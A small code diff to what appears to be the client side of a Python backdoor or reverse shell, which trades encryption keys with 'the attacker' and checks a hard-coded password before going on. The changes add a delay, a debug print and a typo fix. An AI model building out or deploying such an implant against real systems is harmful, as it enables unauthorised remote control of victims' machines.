@@ -3,6 +3,7 @@ import socket
 import subprocess
 import os
 import sys
+from time import sleep
 from cryptidy import asymmetric_encryption as ae
 
 PASSWORD = 'antivirus'
@@ -20,11 +21,14 @@ s.send(pub_key.encode())
 # receive the attacker's public key
 attacker_pub_key = s.recv(1024).decode()
 
+sleep(0.1)
+
 # recv the encrypted password, and it should match ours
 encrypted_password = s.recv(1024)
-_, unencryped_password = ae.decrypt_message(encrypted_password, priv_key)
+print(len(encrypted_password))
+_, unencrypted_password = ae.decrypt_message(encrypted_password, priv_key)
 
-if unencryped_password != PASSWORD:
+if unencrypted_password != PASSWORD:
     s.send('could not verify identity, closing connection\n'.encode())
     s.close()
     sys.exit(0)
